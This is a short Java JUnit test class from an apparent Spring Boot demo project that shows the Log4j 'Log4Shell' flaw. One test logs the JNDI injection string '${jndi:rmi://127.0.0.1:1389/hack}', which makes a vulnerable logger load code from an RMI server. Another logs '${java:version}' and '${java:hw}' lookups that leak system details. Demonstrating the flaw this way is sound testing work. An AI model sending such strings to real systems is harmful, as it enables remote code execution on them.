package com.fentiaozi.bug;

import com.fentiaozi.SpringBootDemoApplication;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

/**
 * @description
 * @author: fentiaozi
 * @date 2022/6/2
 */
@SpringBootTest(classes = SpringBootDemoApplication.class)
@RunWith(SpringJUnit4ClassRunner.class)
public class BugTest {
    private static final Logger LOGGER = LogManager.getLogger(BugTest.class);


    @Test
    public void testSendData() {
        // 通过jndi发送知道命令到
        String bugParams = "${jndi:rmi://127.0.0.1:1389/hack}";
        LOGGER.info("bugParams:{}", bugParams);
    }

    @Test
    public void testBug() {
        String username = "fentiaozi";
        LOGGER.info("username:{}", username);
        String javaVersion = "${java:version}";
        LOGGER.info("javaVersion:{}", javaVersion);
        String javaHw = "${java:hw}";
        LOGGER.info("javaHw:{}", javaHw);
    }

}
